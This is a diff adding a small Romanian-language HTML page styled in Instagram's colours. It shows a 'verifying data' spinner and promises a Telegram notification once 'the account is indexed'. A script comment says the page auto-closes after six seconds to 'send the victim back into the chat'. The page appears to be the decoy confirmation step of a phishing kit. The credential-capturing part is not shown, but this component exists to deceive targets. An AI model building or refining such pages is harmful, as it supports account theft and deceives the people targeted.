@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesare...</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 100px; color: #262626; background: #fafafa; }
+        .loader { border: 3px solid #dbdbdb; border-top: 3px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h3 { font-size: 18px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; padding: 0 20px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h3>Se verifică datele...</h3>
+    <p>Așteaptă un moment. Vei primi o notificare pe Telegram imediat ce contul este indexat.</p>
+
+    <script>
+        // Închide fereastra automat după 6 secunde pentru a trimite victima înapoi în chat
+        setTimeout(function() {
+            window.close();
+        }, 6000);
+    </script>
+</body>
+</html>
